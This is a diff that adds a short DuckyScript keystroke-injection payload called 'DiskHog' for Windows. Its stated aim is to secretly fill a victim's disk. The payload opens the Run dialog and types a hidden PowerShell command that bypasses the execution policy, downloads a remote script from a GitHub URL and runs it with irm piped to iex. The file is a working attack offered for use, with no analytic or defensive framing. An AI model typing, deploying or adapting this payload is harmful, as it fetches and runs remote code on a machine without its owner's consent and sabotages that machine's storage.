@@ -1,0 +1,10 @@
+REM Title: DiskHog
+REM Author: dsymbol
+REM Description: Hidden PowerShell script that consumes as much disk space as possible leaving little room for anything else
+REM Target: Windows
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass irm https://raw.githubusercontent.com/dsymbol/ducky-payloads/main/DiskHog/dh.ps1 | iex
+ENTER
